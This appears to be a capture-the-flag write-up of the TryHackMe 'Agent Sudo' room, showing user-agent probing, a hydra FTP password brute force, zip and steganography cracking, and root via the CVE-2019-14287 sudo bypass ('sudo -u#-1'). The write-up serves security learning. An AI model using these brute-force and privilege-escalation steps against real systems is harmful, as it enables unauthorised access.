---
title: TryHackMe | Agent Sudo
author: Zeropio
date: 2022-09-29
categories: [TryHackMe, Rooms]
tags: [thm, linux]
permalink: /tryhackme/agent-sudo
---

# Foothold

The nmap show:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
```

We can see a difference in the page if we sent `R` as the **user-agent**:

```console
zero@pio$ curl 'http://10.10.191.204/'

	<!DocType html>
	<html>
	<head>
	        <title>Annoucement</title>
	</head>
	
	<body>
	<p>
	        Dear agents,
	        <br><br>
	        Use your own <b>codename</b> as user-agent to access the site.
	        <br><br>
	        From,<br>
	        Agent R
	</p>
	</body>
	</html>
```

```console
zero@pio$ curl 'http://10.10.191.204/' -A 'R'
	What are you doing! Are you one of the 25 employees? If not, I going to report this incident
	<!DocType html>
	<html>
	<head>
	        <title>Annoucement</title>
	</head>
	
	<body>
	<p>
	        Dear agents,
	        <br><br>
	        Use your own <b>codename</b> as user-agent to access the site.
	        <br><br>
	        From,<br>
	        Agent R
	</p>
	</body>
	</html>
```

Testing some **User-agent** we can see a redirection for `User-agent: C`:

```console
zero@pio$ curl -I 'http://10.10.191.204/' -H 'User-agent: C' 
	HTTP/1.1 302 Found
	Date: Thu, 29 Sep 2022 17:44:11 GMT
	Server: Apache/2.4.29 (Ubuntu)
	Location: agent_C_attention.php
	Content-Type: text/html; charset=UTF-8
```

Let’s follow  it:

```console
zero@pio$ curl -iL 'http://10.10.191.204/' -H 'User-agent: C' 
	HTTP/1.1 200 OK
	Date: Thu, 29 Sep 2022 17:44:51 GMT
	Server: Apache/2.4.29 (Ubuntu)
	Vary: Accept-Encoding
	Content-Length: 177
	Content-Type: text/html; charset=UTF-8
	
	Attention chris, <br><br>
	
	Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
	
	From,<br>
	Agent R
```

---

# Fingerprint

Let’s try bruteforcing with this user the ftp:

```console
zero@pio$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.191.204

	[21][ftp] host: 10.10.191.204   login: chris   password: crystal
```

Inside the ftp we found three files, two images and a txt saying that there is a password inside of the images. We can see that one of them have a ZIP:

```console
zero@pio$ binwalk cutie.png 

	DECIMAL       HEXADECIMAL     DESCRIPTION
	--------------------------------------------------------------------------------
	0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
	869           0x365           Zlib compressed data, best compression
	34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
	34820         0x8804          End of Zip archive, footer length: 22

                                                                                                                                           
zero@pio$ binwalk cute-alien.jpg 

	DECIMAL       HEXADECIMAL     DESCRIPTION
	--------------------------------------------------------------------------------
	0             0x0             JPEG image data, JFIF standard 1.01
```

We can get the ZIP as:

```console
zero@pio$ binwalk cutie.png -e
zero@pio$ cd _cutie.png.extracted
zero@pio$ ll
	-rw-r--r-- 1 zeropio zeropio 279312 Sep 29 18:54 365
	-rw-r--r-- 1 zeropio zeropio  33973 Sep 29 18:54 365.zlib
	-rw-r--r-- 1 zeropio zeropio    280 Sep 29 18:54 8702.zip
	-rw-r--r-- 1 zeropio zeropio      0 Oct 29  2019 To_agentR.txt
```

Let’s try getting the ZIP password:

```console
zero@pio$ zip2john 8702.zip
zero@pio$ john hash --wordlist=/usr/share/wordlists/rockyou.txt

	alien            (8702.zip/To_agentR.txt)
```

Inside we found the file `To_agentR.txt`{: .filepath} with the contents:

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

We can decode it:

```console
zero@pio$ echo "QXJlYTUx" | base64 -d
	Area51
```

We can use this password with `steghide`:

```console
zero@pio$ steghide extract -sf cute-alien.jpg 
	Enter passphrase: 
	wrote extracted data to "message.txt".
```

There we can found:

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We can now login as ssh.

---

# Privilege Escalation

We can see some weird privileges:

```console
zero@pio$ sudo -l
	Matching Defaults entries for james on agent-sudo:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User james may run the following commands on agent-sudo:
	    (ALL, !root) /bin/bash
```

We found this [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287). We can easily exploit it with:

```console
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
	root
```